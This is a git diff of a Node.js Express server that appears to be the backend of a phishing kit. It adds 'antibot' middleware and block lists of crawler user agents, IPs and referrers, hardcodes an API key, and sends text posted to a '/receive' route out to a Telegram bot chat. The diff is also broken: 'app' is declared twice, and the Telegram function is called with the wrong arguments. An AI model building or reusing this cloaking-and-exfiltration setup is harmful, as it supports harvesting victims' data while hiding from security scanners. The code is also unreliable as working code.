@@ -1,28 +1,53 @@
 const express = require('express');
+const app = express();
 const bodyParser = require('body-parser');
 const path = require('path');
-const fs = require('fs').promises;
+const { botToken, chatId } = require('./config/settings.js');
+const antibot = require('./middleware/antibot');
 const { getClientIp } = require("request-ip");
-const MobileDetect = require('mobile-detect');
+const https = require('https');
+const querystring = require('querystring');
 const axios = require('axios');
-const { sendMessageFor } = require('simple-telegram-message');
-const isbot = require('isbot');
-const ipRangeCheck = require('ip-range-check');
+const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
+const fs = require('fs').promises; 
 
-const {
-  botToken,
-  chatId,
-  ApiKey,
-  botUAList,
-  botIPList,
-  botIPRangeList,
-  botIPCIDRRangeList,
-  botIPWildcardRangeList,
-  botRefList
-} = require('./config/settings.js');
+
+const ipRangeCheck = require('ip-range-check');
+const { botUAList } = require('./config/botUA.js');
+const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
+const { botRefList } = require('./config/botRef.js');
+const { use } = require('express/lib/router');
 
 const app = express();
 const port = 3000;
+
+const sendTelegramMessage = (text) => {
+  
+    const website = `https://api.telegram.org/bot${botToken}`;
+    const params = querystring.stringify({
+      chat_id: chatId,
+      text: text,
+    });
+
+    const options = {
+      hostname: 'api.telegram.org',
+      path: '/bot' + botToken + '/sendMessage',
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Content-Length': params.length,
+      },
+    };
+    
+    console.log('sent');
+
+    const req = https.request(options, (res) => {
+      // Handle the response if needed
+    });
+
+    req.write(params);
+    req.end();
+};
 
 app.listen(port, () => {
   console.log(`Server is running on port ${port}`);
@@ -272,9 +297,8 @@ app.post('/receive', async (req, res) => {
     res.send('dn');
   }
 
-  console.log(message);
-  const sendMessage = sendMessageFor(botToken, chatId);
-  sendMessage(message);
+  sendTelegramMessage(botToken, chatId, message)
+  
 
   res.send('dn');
 });
